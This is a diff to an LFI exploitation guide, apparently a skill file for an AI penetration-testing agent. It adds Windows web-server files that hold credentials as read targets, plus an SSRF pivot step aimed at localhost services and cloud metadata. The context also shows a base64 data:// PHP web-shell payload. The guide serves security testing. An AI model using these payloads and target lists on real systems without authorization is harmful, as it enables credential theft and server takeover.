@@ -434,6 +434,10 @@ C:\inetpub\logs\LogFiles\
 C:\xampp\apache\conf\httpd.conf
 C:\xampp\apache\logs\access.log
 C:\xampp\mysql\data\mysql\user.MYD
+C:\xampp\phpMyAdmin\config.inc.php   # DB creds, often root with no password
+C:\xampp\passwords.txt               # Plaintext install passwords
+C:\wamp\www\phpinfo.php
+C:\inetpub\wwwroot\web.config        # .NET connection strings, credentials
 C:\Windows\System32\inetsrv\config\applicationhost.config
 C:\Users\Administrator\.ssh\id_rsa
 ```
@@ -457,6 +461,12 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
 apply to UNC paths, so this bypasses the restriction.
 
 ## Step 7: Escalate or Pivot
+
+**SSRF pivot:** If the LFI uses `file_get_contents()`, `include()`, or similar
+functions that accept `http://` URLs, the vulnerability is also an SSRF
+primitive. Test with `http://127.0.0.1/` — if it returns content, report the
+SSRF capability and recommend switching to the ssrf skill for localhost service
+exploitation (database admin panels, internal APIs, cloud metadata).
 
 ## OPSEC Notes
 
